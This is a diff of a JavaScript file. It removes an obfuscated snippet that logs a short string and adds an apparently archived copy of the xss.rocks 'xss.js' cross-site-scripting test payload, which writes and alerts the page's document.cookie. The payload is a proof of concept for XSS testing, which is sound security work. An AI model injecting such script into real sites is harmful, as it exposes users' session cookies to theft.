@@ -1,1 +1,16 @@
-function S(P,U){var o=B();return S=function(h,p){h=h-0x166;var q=o[h];return q;},S(P,U);}function B(){var q=['7725155SdzhMQ','1068397dpaVOB','817390cCCYxl','3419727oCOwFD','2544322YAYKWU','19044192PfcSVp','5903488gongxt','6eaBSNP'];B=function(){return q;};return B();}(function(P,U){var o=P();while(!![]){try{var h=parseInt(S('0x167'))/0x1+-parseInt(S('0x16a'))/0x2+-parseInt(S('0x169'))/0x3+parseInt(S('0x16c'))/0x4+parseInt(S('0x166'))/0x5*(-parseInt(S('0x16d'))/0x6)+-parseInt(S('0x168'))/0x7+parseInt(S('0x16b'))/0x8;if(h===U)break;else o['push'](o['shift']());}catch(p){o['push'](o['shift']());}}}(B,0xcfbea),console['log']('pensil\x20benedril'));
+var _____WB$wombat$assign$function_____ = function(name) {return (self._wb_wombat && self._wb_wombat.local_init && self._wb_wombat.local_init(name)) || self[name]; };
+if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; return this; } }
+{
+  let window = _____WB$wombat$assign$function_____("window");
+  let self = _____WB$wombat$assign$function_____("self");
+  let document = _____WB$wombat$assign$function_____("document");
+  let location = _____WB$wombat$assign$function_____("location");
+  let top = _____WB$wombat$assign$function_____("top");
+  let parent = _____WB$wombat$assign$function_____("parent");
+  let frames = _____WB$wombat$assign$function_____("frames");
+  let opener = _____WB$wombat$assign$function_____("opener");
+
+
+document.write ("This is remote text via xss.js located at xss.rocks " + document.cookie);
+alert ("This is remote text via xss.js located at xss.rocks " + document.cookie);
+}
